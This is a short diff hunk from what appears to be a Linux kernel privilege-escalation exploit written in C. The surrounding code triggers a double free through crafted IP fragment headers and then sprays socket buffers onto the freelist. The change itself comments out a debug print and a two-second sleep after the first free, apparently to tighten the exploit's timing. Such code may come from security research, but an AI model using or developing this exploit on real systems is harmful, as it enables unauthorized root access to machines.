@@ -322,8 +322,8 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
 
-	printf("some chill after 1st free");
-	sleep(2);
+	//printf("some chill after 1st free");
+	//sleep(2);
 	
 	// push N skbs to skb freelist
 	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
